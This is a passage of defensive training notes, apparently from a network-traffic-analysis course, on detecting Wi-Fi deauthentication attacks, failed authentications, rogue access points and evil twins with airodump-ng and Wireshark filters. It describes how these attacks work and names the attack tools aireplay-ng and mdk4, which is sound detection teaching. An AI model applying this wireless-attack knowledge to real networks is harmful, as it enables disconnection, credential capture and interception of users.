<p>Monitor mode is similar to promiscuous mode in Wireshark; it allows you to see raw 802.11 frames and other types of network packets that you wouldn&rsquo;t normally be able to see.</p>
</li>
<li>
<p>Let&rsquo;s assume we do possess a Wi-Fi interface capable of monitor mode.</p>
</li>
<li>
<p>We could enumerate our wireless interfaces in Linux using the following command:</p>
</li>
</ul>
<h4 id="wireless-interfaces">Wireless Interfaces</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iwconfig
</span></span></code></pre></div><pre tabindex="0"><code>wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
</code></pre><ul>
<li>We have a couple of options to set our interface into monitor mode.</li>
</ul>
<h4 id="airmon-ng">Airmon-NG</h4>
<ul>
<li>Firstly, employing <code>airodump-ng</code>, we can use the ensuing command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo airmon-ng start wlan0
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Found 2 processes that could cause trouble.
</span></span><span style="display:flex;"><span>Kill them using &#39;airmon-ng check kill&#39; before putting the card in monitor mode, they will interfere by changing channels and sometimes putting the interface back in managed mode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PID Name
</span></span><span style="display:flex;"><span>    820 NetworkManager
</span></span><span style="display:flex;"><span>    1389 wpa_supplicant
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>PHY Interface Driver Chipset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>phy0 wlan0 rt2800usb Ralink Technology, Corp. RT2870/RT3070
</span></span><span style="display:flex;"><span>            (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
</span></span><span style="display:flex;"><span>            (mac80211 station mode vif disabled for [phy0]wlan0)
</span></span></code></pre></div><h4 id="monitor-mode">Monitor Mode</h4>
<ul>
<li>Secondly, using system utilities, we would need to:
<ul>
<li>Deactivate our interface.</li>
<li>Modify its mode.</li>
<li>Then reactivate it.</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ifconfig wlan0 down
</span></span><span style="display:flex;"><span>sudo iwconfig wlan0 mode monitor
</span></span><span style="display:flex;"><span>sudo ifconfig wlan0 up
</span></span></code></pre></div><ul>
<li>We could verify if our interface is in <code>monitor mode</code> using the <code>iwconfig</code> utility.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iwconfig
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm
</span></span><span style="display:flex;"><span>         Retry short long limit:2 RTS thr:off Fragment thr:off
</span></span><span style="display:flex;"><span>         Power Management:off
</span></span></code></pre></div><ul>
<li>
<p>It&rsquo;s possible that our interface doesn&rsquo;t conform to the <code>wlan0mon</code> convention. Instead, it might bear a name such as the following: <code>wlan0</code>.</p>
</li>
<li>
<p>The crucial factor here is that the mode should be <code>monitor</code>.</p>
</li>
<li>
<p>The name of the interface isn&rsquo;t particularly important, and in many cases, our Linux distribution might assign it a completely different name.</p>
</li>
<li>
<p>To commence/begin capturing traffic from our clients and network, we can employ <code>airodump-ng</code>.</p>
</li>
<li>
<p>We need to specify our AP&rsquo;s:</p>
<ul>
<li>Channel with <code>-c</code>.</li>
<li>Its BSSID with <code>--bssid</code>.</li>
<li>The output file name with <code>-w</code>.</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo airodump-ng -c <span style="color:#ae81ff">4</span> --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>BSSID             PWR RXQ Beacons #Data, #/s CH MB ENC   CIPHER AUTH ESSID
</span></span><span style="display:flex;"><span>F8:14:FE:4D:E6:F1 -23 64  115      6     0   4  130 WPA2 CCMP   PSK HTB-Wireless
</span></span></code></pre></div><ul>
<li>We can use <code>tcpdump</code> to achieve similar outcomes, but <code>airodump-ng</code> proves equally effective.</li>
</ul>
<h2 id="how-deauthentication-attacks-work">How Deauthentication Attacks Work</h2>
<ul>
<li>
<p>Among the more frequent attacks we might witness or detect is a deauthentication/dissociation attack.</p>
</li>
<li>
<p>This is a common type of attack on network links that attackers might use for various purposes:</p>
<ol>
<li><code>To capture the WPA handshake to perform an offline dictionary attack</code></li>
<li><code>To cause general denial of service conditions</code></li>
<li><code>To enforce users to disconnect from our network, and potentially join their network to retrieve information</code></li>
</ol>
</li>
<li>
<p>In essence, the attacker will fabricate an <code>802.11</code> deauthentication frame pretending it originates from our legitimate access point.</p>
</li>
<li>
<p>By doing so, the attacker might manage to disconnect one of our clients from the network.</p>
</li>
<li>
<p>Often, the client will reconnect and go through the handshake process while the attacker is sniffing.
<img src="/Network%20Traffic%20Analysis/deauth-attack.png" alt="deauth-attack"></p>
</li>
<li>
<p>In this attack, the attacker changes the sender&rsquo;s MAC address in a network frame to a fake one.</p>
</li>
<li>
<p>Without extra security measures like IEEE 802.11w (Management Frame Protection), a client device can&rsquo;t easily detect this.</p>
</li>
<li>
<p>Each deauthentication request includes a reason code that explains why the client is being disconnected.</p>
</li>
<li>
<p>In most scenarios, basic tools like <code>aireplay-ng</code> and <code>mdk4</code> employ reason <code>code 7</code> for deauthentication.</p>
</li>
</ul>
<h2 id="finding-deauthentication-attacks">Finding Deauthentication Attacks</h2>
<ul>
<li>To detect these potential attacks, we can open the related traffic capture file (<code>deauthandbadauth.cap</code>) as shown below.</li>
</ul>
<h4 id="wireshark">Wireshark</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo wireshark deauthandbadauth.cap
</span></span></code></pre></div><ul>
<li>
<p>If we wanted to limit our view to traffic from our AP&rsquo;s BSSID (<code>MAC</code>), we could use the following Wireshark filter: <code>wlan.bssid == xx:xx:xx:xx:xx:xx</code>.
<img src="/Network%20Traffic%20Analysis/1-deauth.png" alt="1-deauth"></p>
</li>
<li>
<p>Suppose we wanted to take a look at the deauthentication frames from our BSSID or an attacker pretending to send these from our BSSID, we could use the following Wireshark filter:</p>
</li>
<li>
<p><code>(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)</code></p>
</li>
<li>
<p>With this filter, we specify:</p>
<ul>
<li>The type of frame (<code>management</code>) with <code>00</code>.</li>
<li>The subtype (<code>deauthentication</code>) with <code>12</code>.
<img src="/Network%20Traffic%20Analysis/2-deauth.png" alt="2-deauth"></li>
</ul>
</li>
<li>
<p>We might notice right away that an excessive amount of deauthentication frames were sent to one of our client devices.</p>
</li>
<li>
<p>This would be an immediate indicator of this attack.</p>
</li>
<li>
<p>Additionally, if we were to open the fixed parameters under wireless management, we might notice that reason <code>code 7</code> was utilized.
<img src="/Network%20Traffic%20Analysis/3-deauth.png" alt="3-deauth"></p>
</li>
<li>
<p>As previously mentioned, if we wanted to verify this was done by an attacker, we should be able to filter even further for only deauthentication requests with reason <code>code 7</code>.</p>
</li>
<li>
<p>As mentioned, <code>aireplay-ng</code> and <code>mdk4</code>, which are common attack tools, utilize this reason code by default.</p>
</li>
<li>
<p>We could do with the following Wireshark filter.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)</code>
<img src="/Network%20Traffic%20Analysis/4-deauth.png" alt="4-deauth"></p>
</li>
</ul>
<h2 id="revolving-reason-codes">Revolving Reason Codes</h2>
<ul>
<li>
<p>A sophisticated attacker might evade detection by rotating/revolving reason codes to avoid triggering alarms from wireless intrusion detection systems.</p>
</li>
<li>
<p>The trick to this technique of detection is incrementing like an attacker script would. We would first start with reason code 1.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)</code>
<img src="/Network%20Traffic%20Analysis/5-deauth.png" alt="5-deauth"></p>
</li>
<li>
<p>Then we would shift over to reason code 2.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)</code>
<img src="/Network%20Traffic%20Analysis/6-deauth.png" alt="6-deauth"></p>
</li>
<li>
<p>We would continue this sequence.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 3)</code>
<img src="/Network%20Traffic%20Analysis/7-deauth.png" alt="7-deauth"></p>
</li>
<li>
<p>As such, deauthentication can be a pain to deal with, but we have some compensating measures that we can implement to prevent this from occurring in the modern day and age.</p>
</li>
<li>
<p>These are:</p>
<ol>
<li><code>Enable IEEE 802.11w (Management Frame Protection) if possible</code></li>
<li><code>Utilize WPA3-SAE</code></li>
<li><code>Modify our WIDS/WIPS detection rules</code></li>
</ol>
</li>
</ul>
<h4 id="finding-failed-authentication-attempts">Finding Failed Authentication Attempts</h4>
<ul>
<li>
<p>Suppose an attacker was to attempt to connect to our wireless network.</p>
</li>
<li>
<p>We might notice an excessive amount of association requests coming from one device.</p>
</li>
<li>
<p>To filter for these we could use the following.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)</code>
<img src="/Network%20Traffic%20Analysis/1-fakeauth.png" alt="1-fakeauth"></p>
</li>
<li>
<p>Therefore, we need to be able to tell the difference between normal Wi-Fi (802.11) network activity and malicious network activity.</p>
</li>
<li>
<p>From this point of view, having security at the link-layer can determine whether our security is breached.</p>
</li>
</ul>
<hr>
<h1 id="rogue-access-point--evil-twin-attacks">Rogue Access Point &amp; Evil-Twin Attacks</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>rogueap.cap</code>.</p>
</li>
<li>
<p>Dealing with rogue/unauthorized access points and evil-twin attacks can be difficult because they are often hard to find.</p>
</li>
<li>
<p>However, with the right methods/strategies, you can identify and handle these illegitimate access points well.</p>
</li>
<li>
<p>When it comes to harmful access points, rogue and evil-twin attacks are always major issues.
<img src="/Network%20Traffic%20Analysis/rogueap.png" alt="rogueap"></p>
</li>
<li>
<p>A rogue access point is mainly used to bypass/cirumvent security measures.</p>
</li>
<li>
<p>Attackers might install one to avoid network restrictions, which could be hotspots or tethered connections.</p>
</li>
<li>
<p>These access points can even infiltrate networks that are supposed to be isolated.</p>
</li>
<li>
<p>Their main purpose is to give unauthorized access to secure parts of a network.</p>
</li>
<li>
<p>It&rsquo;s important to remember that rogue access points are directly connected to the network.</p>
</li>
</ul>
<h2 id="evil-twin">Evil-Twin</h2>
<ul>
<li>
<p>An evil twin, however, is set up by an attacker for various malicious purposes.</p>
</li>
<li>
<p>The main point is that these access points are usually not connected to your network.</p>
</li>
<li>
<p>Instead, they are independent access points that might include a web server or similar component to intercept communications between wireless clients.
<img src="/Network%20Traffic%20Analysis/evil-twin.png" alt="evil-twin"></p>
</li>
<li>
<p>Attackers might set these up to harvest wireless or domain passwords among other pieces of information.</p>
</li>
<li>
<p>Commonly, these attacks might also encompass a hostile portal attack.</p>
</li>
</ul>
<h2 id="airodump-ng-detection">Airodump-ng Detection</h2>
<ul>
<li>Right away, we could utilize the ESSID filter for Airodump-ng to detect Evil-Twin style access points.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo airodump-ng -c <span style="color:#ae81ff">4</span> --essid HTB-Wireless wlan0 -w raw
</span></span></code></pre></div><pre tabindex="0"><code>CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06    
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
 F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless
</code></pre><ul>
<li>
<p>The previous example illustrates how an attacker could create a fake Wi-Fi hotspot with the same name as your network.</p>
</li>
<li>
<p>This is often done to set up a malicious portal, where the attacker tries to steal usernames and passwords from unsuspecting users.</p>
</li>
<li>
<p>You should also watch out for deauthentication attacks, which might indicate that the attacker is trying to force users onto their fake network.</p>
</li>
<li>
<p>To conclusively ascertain whether this is an anomaly or an Airodump-ng error, we can commence our traffic analysis efforts (<code>rogueap.cap</code>).</p>
</li>
<li>
<p>To filter for beacon frames, we could use the following.</p>
</li>
<li>
<p><code>(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)</code>
<img src="/Network%20Traffic%20Analysis/1-evil-twin.png" alt="1-evil-twin"></p>
</li>
<li>
<p>Beacon analysis is crucial in differentiating between genuine and fraudulent access points.</p>
</li>
<li>
<p>One of the initial places to start is the <code>Robust Security Network (RSN)</code> information.</p>
</li>
<li>
<p>This data communicates valuable information to clients about the supported ciphers, among other things.</p>
</li>
<li>
<p>Suppose we wish to examine our legitimate access point&rsquo;s RSN information.
<img src="/Network%20Traffic%20Analysis/2-evil-twin.png" alt="2-evil-twin"></p>
</li>
<li>
<p>It would indicate that WPA2 is supported with AES and TKIP with PSK as its authentication mechanism.</p>
</li>
<li>
<p>However, when we switch to the illegitimate access point&rsquo;s RSN information, we may find it conspicuously missing.
<img src="/Network%20Traffic%20Analysis/3-evil-twin.png" alt="3-evil-twin"></p>
</li>
<li>
<p>Most of the time, a typical evil-twin attack will have this feature.</p>
</li>
<li>
<p>However, we should always check other details for differences, especially with more advanced evil-twin attacks.</p>
</li>
<li>
<p>For instance, an attacker could use the same encryption method as our access point, making the attack harder to spot.</p>
</li>
<li>
<p>If that happens, we can look at other parts of the beacon frame, like vendor-specific information, which the attacker&rsquo;s access point probably won&rsquo;t have.</p>
</li>
</ul>
<h2 id="finding-a-fallen-user">Finding a Fallen User</h2>
<ul>
<li>
<p>Despite comprehensive security awareness training, some users may fall prey to attacks like these.</p>
</li>
<li>
<p>Fortunately, in the case of open network style evil-twin attacks, we can view most higher-level traffic in an unencrypted format.</p>
</li>
<li>
<p>To filter exclusively for the evil-twin access point, we would employ the following filter.</p>
</li>
<li>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F2)</code>
<img src="/Network%20Traffic%20Analysis/4-evil-twin.png" alt="4-evil-twin"></p>
</li>
<li>
<p>If we see ARP requests coming from a client device on the suspicious network, it could mean the device is compromised.</p>
</li>
<li>
<p>If this happens, we should save information about the device to help us respond to the incident.</p>
<ol>
<li><code>Its MAC address</code></li>
<li><code>Its host name</code></li>
</ol>
</li>
<li>
<p>Consequently, we might be able to instigate password resets and other reactive measures to prevent further infringement of our environment.</p>
</li>
</ul>
<h2 id="finding-rogue-access-points">Finding Rogue Access Points</h2>
<ul>
<li>On the other hand, detecting rogue access points can often be a simple task of checking our network device lists.</li>
<li>In the case of hotspot-based rogue access points (such as Windows hotspots), we might scrutinize wireless networks in our immediate vicinity.</li>
<li>If we encounter an unrecognizable wireless network with a strong signal, particularly if it lacks encryption, this could indicate that a user has established a rogue access point to navigate around our perimeter controls.</li>
</ul>
<hr>
]]></content>
        </item>
        
    </channel>
</rss>
